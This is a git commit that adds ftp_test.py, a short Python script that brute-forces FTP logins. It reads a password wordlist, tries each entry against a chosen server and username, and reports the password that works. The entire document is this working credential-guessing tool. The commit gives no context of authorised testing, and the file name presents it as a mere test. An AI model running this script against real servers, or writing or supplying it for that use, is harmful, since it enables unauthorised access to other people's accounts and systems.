a25474904df1b168ec224c695a78c4f10ef4ee7c
unkn0wn101010 <xhacker.unknown@outlook.com>
2026-04-20 18:49:55 +0530

    Add files via upload

---
+++ ftp_test.py
@@ -0,0 +1,30 @@
+#!/usr/bin/python3
+import ftplib
+import os
+
+
+server = input("FTP server: ")
+user = input("Username: ")
+
+password_list = input("Path to password list: ")
+
+
+if not os.path.exists(password_list):
+    print("Password file not found.")
+    exit()
+
+passwords = []
+with open(password_list, 'r') as pw:
+    for word in pw:
+        passwords.append(word.strip('\r\n'))
+
+for password in passwords:
+    try:
+        ftp = ftplib.FTP(server)
+        ftp.login(user, password)
+        print(f'Success! The password is: {password}')
+        break
+    except ftplib.error_perm as exc:
+        print(f'Still trying... {exc}')
+else:
+    print('Unable to find a valid password.')
